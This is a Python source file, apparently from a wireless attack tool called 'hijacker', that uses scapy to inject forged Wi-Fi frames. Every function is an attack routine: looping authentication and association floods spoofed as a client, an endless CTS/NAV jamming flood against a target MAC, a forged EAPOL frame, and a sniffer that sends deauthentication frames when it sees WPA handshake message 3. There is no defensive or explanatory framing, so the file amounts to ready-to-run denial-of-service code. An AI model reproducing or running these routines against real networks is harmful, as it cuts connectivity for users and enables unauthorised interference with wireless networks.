from time import sleep

from scapy.sendrecv import sniff
from scapy.contrib.wpa_eapol import WPA_key
from scapy.layers.dot11 import Dot11, Dot11Auth, RadioTap, Dot11AssoReq, EAPOL, Dot11Deauth
from termcolor import cprint

from hijacker.core import Station, AP
from hijacker.interface import MonitorInterface

WPA_KEY_INFO_INSTALL = 64
WPA_KEY_INFO_ACK = 128
WPA_KEY_INFO_MIC = 256


def auth_attack(interface, sta, ap):
    pkt = RadioTap() / Dot11(addr1=ap.bssid, addr2=sta.mac_addr, addr3=ap.bssid) / \
          Dot11Auth(algo=0, seqnum=0x0001, status=0x0000)
    while True:
        cprint("ZZZ", 'blue')
        interface.inject(pkt)
        pkt.SC += 3
        sleep(1)


def forged_1(interface, ap, sta):
    pkt = RadioTap() / Dot11(addr1=sta.mac_addr, addr2=ap.bssid, addr3=ap.bssid) / \
          EAPOL(type=3)
    interface.inject(pkt)


def cts_nav_attack(interface, target_mac):
    # http://matej.sustr.sk/publ/articles/cts-dos/cts-dos.en.html
    # pkt = RadioTap(len=18, present='Flags+Rate+Channel+dBm_AntSignal+Antenna',
    pkt = RadioTap() / \
          Dot11(ID=0x7d00, type='Control', subtype=12, addr1=target_mac)
    while True:
        interface.inject(pkt)


def sa_query_attack(interface, ap, sta):
    pkt = Dot11(addr1=ap.bssid, addr2=sta.mac_addr, addr3=ap.bssid) / \
          Dot11AssoReq(cap=0x1100, listen_interval=0x000a)
    while True:
        interface.inject(pkt)


def ap_deauth(interface: MonitorInterface, ap: AP, sta: Station):
    def ap_deauth_cb(p):
        # https://digi.ninja/gawn_gold/4whsg.py
        if p.haslayer(WPA_key) and p.addr3 == ap.bssid:
            layer = p.getlayer(WPA_key)
            key = layer.key_info
            if key & WPA_KEY_INFO_MIC and key & WPA_KEY_INFO_INSTALL and key & WPA_KEY_INFO_ACK:
                cprint("Attacking {}!".format(p.addr1), 'red')
                interface.deauth(ap.bssid, sta.mac_addr, bssid=ap.bssid, burst_count=1, reason=3)
    return ap_deauth_cb


def eapol_attack_deauth(interface: MonitorInterface, ap: AP, sta: Station):
    print("Waiting for EAPOL frame 3...")
    sniff(iface=interface.name, prn=ap_deauth(interface, ap, sta))
